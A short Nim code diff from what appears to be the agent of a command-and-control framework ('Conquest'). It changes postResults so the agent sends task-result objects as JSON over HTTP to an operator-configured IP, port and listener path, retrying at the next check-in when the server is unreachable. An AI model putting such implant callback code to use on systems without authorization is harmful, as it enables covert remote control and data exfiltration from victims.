@@ -49,20 +49,20 @@ proc getTasks*(config: AgentConfig, agent: string): seq[Task] =
 
     return @[]
 
-proc postResults*(config: AgentConfig, agent: string, task: Task): bool = 
+proc postResults*(config: AgentConfig, agent: string, taskResult: TaskResult): bool = 
     
     let client = newAsyncHttpClient()
 
     # Define headers
     client.headers = newHttpHeaders({ "Content-Type": "application/json" })
     
-    let taskJson = %task
+    let taskJson = %taskResult
 
     echo $taskJson
 
     try:
         # Register agent to the Conquest server
-        discard waitFor client.postContent(fmt"http://{config.ip}:{$config.port}/{config.listener}/{agent}/{task.id}/results", $taskJson)
+        discard waitFor client.postContent(fmt"http://{config.ip}:{$config.port}/{config.listener}/{agent}/{taskResult.task}/results", $taskJson)
     except CatchableError as err:
         # When the listener is not reachable, don't kill the application, but check in at the next time
         echo "[-] [postResults]: ", err.msg
